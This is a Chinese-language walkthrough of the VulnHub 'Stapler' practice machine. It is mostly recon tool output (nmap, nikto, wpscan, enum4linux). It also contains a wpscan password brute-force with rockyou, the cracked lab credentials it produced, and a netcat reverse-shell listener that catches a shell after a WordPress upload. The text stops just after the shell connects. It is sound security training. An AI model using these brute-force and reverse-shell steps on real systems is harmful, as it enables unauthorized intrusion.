
# Preface
最近有点HW的事情耽搁了一下进度，原本在一个周前就已经打完了这台靶机，这个walk through也应该在一个周前完成的。
[靶机地址: https://www.vulnhub.com/entry/stapler-1,150/](https://www.vulnhub.com/entry/stapler-1,150/)
这个靶机也有很多有意思的地方，大家可以自己挖掘，也是目前为止我遇到的靶机中比较丰富的，正是这样的多样性，增强了不少趣味性，在此，衷心感谢辛辛苦苦编译环境的作者(g0tmi1k)，非常感谢你们的辛勤付出。 :thumbsup:  :thumbsup:  :thumbsup:

# Information Gathering
```shell
┌──(root㉿kali)-[/stapler]
└─# cat nmap.txt
# Nmap 7.92 scan initiated Tue Jun 28 21:47:35 2022 as: nmap -sS -T5 -sC -A -p- -Pn -oN nmap.txt 192.168.0.154
Nmap scan report for 192.168.0.154
Host is up (0.00044s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.0.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: LongPassword, FoundRows, Support41Auth, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsTransactions, ConnectWithDatabase, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, InteractiveClient, ODBCClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: <\x05cH+@\x04\x08\x1B\x1Dxh;M\x080\x10hD\x01
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.92%I=7%D=6/28%Time=62BBAF71%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D40,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:84:AF:B6 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 7h40m00s, deviation: 34m37s, median: 7h59m59s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-06-29T09:48:47
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2022-06-29T10:48:47+01:00
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.0.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 28 21:49:17 2022 -- 1 IP address (1 host up) scanned in 101.34 seconds
```

## FTP
```shell
┌──(root㉿kali)-[~]
└─# ftp anonymous@192.168.0.152
Connected to 192.168.0.152.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> help
Commands may be abbreviated.  Commands are:

!		ftp		msend		restart
$		gate		newer		rhelp
account		get		nlist		rmdir
append		glob		nmap		rstatus
ascii		hash		ntrans		runique
bell		help		open		send
binary		idle		page		sendport
bye		image		passive		set
case		lcd		pdir		site
cd		less		pls		size
cdup		lpage		pmlsd		sndbuf
chmod		lpwd		preserve	status
close		ls		progress	struct
cr		macdef		prompt		sunique
debug		mdelete		proxy		system
delete		mdir		put		tenex
dir		mget		pwd		throttle
disconnect	mkdir		quit		trace
edit		mls		quote		type
epsv		mlsd		rate		umask
epsv4		mlst		rcvbuf		unset
epsv6		mode		recv		usage
exit		modtime		reget		user
features	more		remopts		verbose
fget		mput		rename		xferbuf
form		mreget		reset		?
ftp> help more
more       	view a remote file through your pager
ftp> more note
Elly, make sure you update the payload information. Leave it in your FTP accoun
t once your are done, John.
```
得到两个用户名：john、elly
使用elly/john登录一下ftp：
```shell
┌──(root㉿kali)-[~]
└─# ftp elly@192.168.0.152
Connected to 192.168.0.152.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed

┌──(root㉿kali)-[~]
└─# ftp john@192.168.0.152
Connected to 192.168.0.152.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed

┌──(root㉿kali)-[~]
└─# ftp harry@192.168.0.152
Connected to 192.168.0.152.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp>
```
等到一个用户名：harry，现在用户名为：john、elly、harry

## SSH
```shell
┌──(root㉿kali)-[~]
└─# ssh john@192.168.0.152
The authenticity of host '192.168.0.152 (192.168.0.152)' can't be established.
ED25519 key fingerprint is SHA256:eKqLSFHjJECXJ3AvqDaqSI9kP+EbRmhDaNZGyOrlZ2A.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.152' (ED25519) to the list of known hosts.
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
john@192.168.0.152's password:
Connection closed by 192.168.0.152 port 22

┌──(root㉿kali)-[~]
└─# ssh elly@192.168.0.152
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
elly@192.168.0.152's password:
Permission denied, please try again.
elly@192.168.0.152's password:
Connection closed by 192.168.0.152 port 22

┌──(root㉿kali)-[~]
└─# ssh harry@192.168.0.152
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
harry@192.168.0.152's password:
Permission denied, please try again.
harry@192.168.0.152's password:
Permission denied, please try again.
harry@192.168.0.152's password:
harry@192.168.0.152: Permission denied (publickey,password).
```
新增用户名为barry，目前的用户名列表是：john、elly、harry、barry，而且barry应该是用密钥登录。

## web
```shell
┌──(root㉿kali)-[/stapler]
└─# cat nikto.txt
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.0.102
+ Target Port: 80
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3093: GET /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ OSVDB-3093: GET /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
┌──(root㉿kali)-[/stapler]
└─# cat nikto-12380.txt
- Nikto v2.1.6/2.1.5
+ No web server found on 192.168.0.101:12380
- Nikto v2.1.6/2.1.5
+ Target Host: 192.168.0.102
+ Target Port: 12380
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
+ GET The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ GET The site uses SSL and Expect-CT header is not present.
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ GET Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ GET "robots.txt" contains 2 entries which should be manually viewed.
+ GET Hostname '192.168.0.102' does not match certificate's names: Red.Initech
+ HEAD Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ GET Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ GET /phpmyadmin/: phpMyAdmin directory found
```
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/1.png" width="56%"></br>
得到两个用户名：tim、zoe
访问web页面https://192.168.0.150:12380/blogblog/：
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/2.png" width="56%"></br>

看到wordpress后，使用wpscan跑一下：</br>

```shell
┌──(root㉿kali)-[/stapler]
└─# wpscan --url https://192.168.0.150:12380/blogblog/ -e ap,vt,u --plugins-detection mixed -v --disable-tls-checks -o wpscan.txt
┌──(root㉿kali)-[/stapler]
└─# cat wpscan.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://192.168.0.150:12380/blogblog/ [192.168.0.150]
[+] Started: Sun Jul  3 22:43:30 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.18 (Ubuntu)
 |  - Dave: Soemthing doesn't look right here
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://192.168.0.150:12380/blogblog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://192.168.0.150:12380/blogblog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Registration is enabled: https://192.168.0.150:12380/blogblog/wp-login.php?action=register
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: https://192.168.0.150:12380/blogblog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://192.168.0.150:12380/blogblog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
 | Found By: Emoji Settings (Passive Detection)
 |  - https://192.168.0.150:12380/blogblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - https://192.168.0.150:12380/blogblog/, Match: 'WordPress 4.2.1'

[i] The main theme could not be detected.


[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.0.150:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.0.150:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.0.150:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 4.2.4
 | Last Updated: 2022-05-20T09:58:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.0.150:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.0.150:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.0.150:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.7.1
 | Last Updated: 2022-03-23T17:13:00.000Z
 | Readme: https://192.168.0.150:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.150:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.


[i] No themes Found.


[i] User(s) Identified:

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jul  3 22:46:35 2022
[+] Requests Done: 99058
[+] Cached Requests: 59
[+] Data Sent: 29.31 MB
[+] Data Received: 13.379 MB
[+] Memory used: 535.461 MB
[+] Elapsed time: 00:03:04
```
得到一堆用户:barry,garry,harry,scott,kathy,tim,elly,john,peter,heather
破解一下密码试试：
```shell
┌──(root㉿kali)-[/stapler]
└─#wpscan --url https://192.168.0.150:12380/blogblog/ -U wpsusername.txt -P /usr/share/wordlists/rockyou.txt
[+] Performing password attack on Xmlrpc Multicall against 10 user/s
[SUCCESS] - garry / football
[SUCCESS] - harry / monkey
[SUCCESS] - scott / cookie
[SUCCESS] - kathy / coolgirl
[SUCCESS] - barry / washere
[SUCCESS] - john / incorrect
```
## SMB
枚举共享目录
```shell
┌──(root㉿kali)-[/stapler]
└─# enum4linux -S 192.168.0.150
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  4 09:16:41 2022

 =========================================( Target Information )=========================================

Target ........... 192.168.0.150
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.150 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===================================( Session Check on 192.168.0.150 )===================================


[+] Server 192.168.0.150 allows sessions using username '', password ''


 ================================( Getting domain SID for 192.168.0.150 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 =================================( Share Enumeration on 192.168.0.150 )=================================


	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            RED

[+] Attempting to map shares on 192.168.0.150

//192.168.0.150/print$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.0.150/kathy	Mapping: OK Listing: OK Writing: N/A
//192.168.0.150/tmp	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.0.150/IPC$	Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Mon Jul  4 09:16:41 2022
```
枚举用户名：
```shell
┌──(root㉿kali)-[/stapler]
└─# enum4linux -r 192.168.0.150
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  4 09:18:46 2022

 =========================================( Target Information )=========================================

Target ........... 192.168.0.150
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.150 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===================================( Session Check on 192.168.0.150 )===================================


[+] Server 192.168.0.150 allows sessions using username '', password ''


 ================================( Getting domain SID for 192.168.0.150 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ==================( Users on 192.168.0.150 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''

S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)
enum4linux complete on Mon Jul  4 09:19:00 2022
```
# Vulnerability Analysis
通过信息收集我们得到的可攻击的点是：
1. 通过FTP、SMB、web服务我们收集到很多的用户名列表：
```shell
┌──(root㉿kali)-[/stapler]
└─# cat username.txt
john
elly
harry
barry
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
nobody
tim
zoe
garry
scott
kathy
peter
heather
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
NATHAN
www
```
2. 网站有wordpress，有目录读取漏洞、本地文件包含漏洞等。而且破解几个可以登录的账号：
garry/football
harry/monkey
scott/cookie
kathy/coolgirl
barry/washere
john/incorrect(web管理员，可以上传文件)

# Exploitation
## 1. 通过john/incorrect获取shell
<img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/3.png" width="56%"></br>
```shell
┌──(root㉿kali)-[/stapler]
└─# nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.150] 52496
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 03:18:58 up 6 min,  0 users,  load average: 0.00, 0.12, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
